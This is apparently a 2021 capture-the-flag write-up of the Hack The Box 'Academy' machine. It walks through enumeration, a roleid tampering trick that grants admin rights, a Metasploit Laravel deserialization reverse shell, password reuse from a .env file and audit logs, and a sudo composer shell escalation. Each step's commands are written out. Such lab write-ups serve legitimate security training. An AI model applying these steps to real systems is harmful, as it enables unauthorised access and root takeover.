---
layout: post
title:  "Hack The Box - Academy Writeup"
date:   2021-02-27 06:00:00
categories: Security CTF HTB"
author: Ryan
---

*[Hack The Box](https://hackthebox.eu) is an online platform allowing you to test your penetration testing skills and exchange ideas and methodologies with thousands of people in the security field.*  
![Header](../images/HTB-Academy/Header.png)

Academy is an Easy level linux machine. Based on the creator and community statistics, we'll likely have a decent amount of enumeration to get through, while working heavily off of existing CVEs, against a realistic environment.  
![Statistics](../images/HTB-Academy/Statistics.png)

## Information Gathering

### Nmap:
By scanning the target IP with Nmap, we're able to find what ports are open (`-p`), while fingerprinting the services running and their versions (`-sV`). We're also running the default set of scripts (`-sC`), which can help find additional information and automate some of our initial steps. Once the scan is completed, nmap with write the results to our Extracts folder (`-oA`)  
`>> nmap -p22,80,33060 -sC -sV -oA Extracts/Academy 10.10.10.215`  
![Nmap](../images/HTB-Academy/nmap.png)

* **Port 22 - SSH**: Pretty standard port to see open on linux boxes, we can try to leverage this later on if we find credentials or private key.
* **Port 80 - HTTP**: A basic websever hosting what appears to be an simple website on Apache v2.4.41.
* **Port 33060 - MYSQLX**: MySQL is a freely available open source Relational Database Management System. The X Protocol found here is supported by MySQL Shell, MySQL Connectors, and MySQL Router.

We'll also want to add Academy.htb to our hosts file.

### Academy Site
Navigating to the Academy site on port 80 reveals a very basic landing page and two links to Login.php and Register.php. We can attempt to enumerate additional pages using `gobuster` and a wordlist of commonly used resources.  
`>> gobuster dir -u academy.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -t 100`  
![Gobuster](../images/HTB-Academy/Recon_Gobuster.png)  

The most promising result of the Gobuster scan is the discovery of an administrative area. Unfortunately, it appears to be behind a login. Let's move on to registering an account and see what we can find once we're authenticated.  
![Register](../images/HTB-Academy/Recon_Register.png)  

Interesting. Capturing the registration request with our `Burpsuite` proxy reveals that in addition to our username and password, there's a `roleid` defaulting to 0. It's possible this flag could differentiate a normal user from an admin, let's change that to a 1?  
![Admin](../images/HTB-Academy/Recon_Admin.png)  

Looks like we were right about the `roleid` and successfully created our own administrative account! Logging into the /admin.php page reveals some usernames (`cry0l1t3` and `mrb3n`), as well as another subdomain `dev-staging-01.academy.htb`. Let's add that to our host file and go there next.

### Dev-Staging-01
Navigating to the dev-staging area, we're shown a dashboard with a large amount of system configuration and application information. There's a lot to dig through, but we should be able to find something interesting to work with.  
![Admin](../images/HTB-Academy/Recon_DevStage.png)

## Foothold
[Laravel](https://laravel.com/) is a framework for building web applications in PHP. Searching Exploit.db leads us to the following [metasploit module](https://www.exploit-db.com/exploits/47129), for a deserialization attack leveraging the App_Key and gaining remote code execution. Based on the configuration findings in our Information Gathering stage, we should have all the pieces needed to make this work.  
`>> msfconsole`  
`>> use exploit/unix/http/laravel_token_unserialize_exec`  
`>> set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=`  
`>> set RHOSTS academy.htb`  
`>> set VHOST dev-staging-01.academy.htb`  
`>> set LHOST tun0`  
![Reverse Shell](../images/HTB-Academy/Foothold_MSFConsole.png)  

### Upgrading our Shell
The initial shell we've got is clunky and not very easy to use. Let's upgrade it with the following commands:  
`>> python3 -c "import pty; pty.spawn('/bin/bash')"`  
`>> export TERM=xterm`

### Looking Around the Box
We appear to be connected as the www-data user, which doesnt have access to the user.txt flag. By checking through the users in the `/home` directory, we can see the flag belongs to `cry0l1t3`, an admin of the site.

## Lateral Movement 1
When we first landed in the box, we found ourself in the `/var/www/html/htb-academy-dev-01/public` directory. Digging around, we eventually find a hidden `.env` file containing much of the same information we already noted in the website. However, by looking in the equivalent file from the `/var/www/html/academy` directory, we discover a few changes; The most important of which is that the database password has been changed to `mySup3rP4s5w0rd!!`.

When users are asked to create a new password for something, it's very common for them to reuse a password from somewhere else. It's familiar to them, and easier to remember. Keeping that in mind, we attempt to authenticate with each of the users we discovered in the `/home` directory, successfully authenticating with our flag holder `cry0l1t3`.  
`>> ssh cry0l1t3@10.10.10.215`  
`>> mySup3rP4s5w0rd!!`

### User Flag
![User Flag](../images/HTB-Academy/User_Flag.png)  

## Lateral Movement 2
With our new user access we can continue to look around the box, checking areas we may not have had access to before. Whether running an automated enumeration script, or by digging through the box manually, we can eventually be led to system logs with more valuable secrets to use.  
`>> ausearch -c su`  
![Logs](../images/HTB-Academy/Lateral2_Logs.png)  

The data we found is currently in hex format, but decoding it reveals the text: `mrb3n_Ac@d3my!`. Lets see if it works for the mrb3n account:  
`>> su mrb3n`  
`>> mrb3n_Ac@d3my!`

## Privilege Escalation
One of the first enumeration commands to run as a new user is `sudo -l`. This allows us to list out the priviledged commands we can run, as long as we have the user's password.  
`>> sudo -l`  
`>> mrb3n_Ac@d3my!`  
![Sudo](../images/HTB-Academy/PrivEsc_Sudo.png)  

Referencing the [GTFOBins](https://gtfobins.github.io/gtfobins/composer/#sudo) page for Composer, we're shown the following escilation steps:  
`>> TF=$(mktemp -d)`  
`>> echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json`  
`>> sudo composer --working-dir=$TF run-script x`  

### Root Flag
![Root Flag](../images/HTB-Academy/Root_Flag.png)  